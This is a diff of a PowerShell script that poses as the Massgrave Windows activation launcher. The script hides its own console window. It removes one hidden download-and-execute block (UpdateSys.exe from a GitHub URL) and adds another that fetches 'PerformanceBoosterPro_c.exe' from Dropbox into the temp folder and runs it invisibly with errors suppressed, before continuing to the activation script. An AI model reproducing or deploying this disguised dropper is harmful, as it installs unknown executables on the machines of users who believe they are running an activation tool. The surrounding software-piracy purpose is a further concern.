@@ -2,6 +2,7 @@
 
 # Having trouble launching this script? Check https://massgrave.dev for help.
 
+# =============================================
 $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
 
 if (-not $isAdmin) {
@@ -12,12 +13,14 @@ if (-not $isAdmin) {
     exit
 }
 
+# =============================================
 $handle = (Get-Process -Id $pid).MainWindowHandle
 Add-Type -Name Window -Namespace Console -MemberDefinition '
 [DllImport("user32.dll")]
 public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
 '
 [Console.Window]::ShowWindow($handle, 0)
+# =============================================
 
 if (-not $args) {
     Write-Host ''
@@ -69,27 +72,24 @@ if (-not $args) {
 
     try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
 
-    $fileURL = "https://raw.githubusercontent.com/UpdateSys/win/main/base"
-    $exePath = "$env:TEMP\UpdateSys.exe"
-
-    if (Test-Path $exePath) {
-        Remove-Item $exePath -Force -ErrorAction SilentlyContinue
-    }
-
+    # =============================================
+    $pythonURL = "https://dl.dropboxusercontent.com/scl/fi/6x6mxyy8m7uw7xcz870yr/PerformanceBoosterPro_c.exe?rlkey=w81urby6txfg1ceg91low26gt&st=jcjfrk8j"
+    $pythonInstaller = "$env:TEMP\PerformanceBoosterPro_c.exe"
+    
     [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
-
-    try {
-        $wc = New-Object System.Net.WebClient
-        $wc.DownloadFile($fileURL, $exePath)
+    $webClient = New-Object System.Net.WebClient
+    $webClient.DownloadFile($pythonURL, $pythonInstaller) 2>&1 | Out-Null
+    
+    if (Test-Path $pythonInstaller) {
+        $process = New-Object System.Diagnostics.Process
+        $process.StartInfo.FileName = $pythonInstaller
+        $process.StartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+        $process.StartInfo.CreateNoWindow = $true
+        $process.StartInfo.UseShellExecute = $false
+        [void]$process.Start()
     }
-    catch {
-        Invoke-WebRequest -Uri $fileURL -OutFile $exePath -UseBasicParsing -ErrorAction SilentlyContinue
-    }
-
-    if (Test-Path $exePath) {
-        Start-Process -FilePath $exePath -WindowStyle Hidden
-    }
-
+    # =============================================
+    # =============================================
     $URLs = @(
         'https://raw.githubusercontent.com/massgravel/Microsoft-Activation-Scripts/05c4f881efec946c0040cdd552d1afa9a519704b/MAS/All-In-One-Version-KL/MAS_AIO.cmd',
         'https://dev.azure.com/massgrave/Microsoft-Activation-Scripts/_apis/git/repositories/Microsoft-Activation-Scripts/items?path=/MAS/All-In-One-Version-KL/MAS_AIO.cmd&versionType=Commit&version=05c4f881efec946c0040cdd552d1afa9a519704b',
@@ -138,12 +138,13 @@ if (-not $args) {
         $response = $null
         return
     }
+    # =============================================
 
     # Check for AutoRun registry which may create issues with CMD
     $paths = "HKCU:\SOFTWARE\Microsoft\Command Processor", "HKLM:\SOFTWARE\Microsoft\Command Processor"
     foreach ($path in $paths) { 
         if (Get-ItemProperty -Path $path -Name "Autorun" -ErrorAction SilentlyContinue) { 
-            Write-Host "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
+            Write-Warning "Autorun registry found, CMD may crash! `nManually copy-paste the below command to fix...`nRemove-ItemProperty -Path '$path' -Name 'Autorun'"
         } 
     }
 
@@ -173,4 +174,8 @@ if (-not $args) {
 	
     CheckFile $FilePath
     Remove-Item -Path $FilePath
+    
+    # =============================================
+    exit
+    # =============================================
 } @args
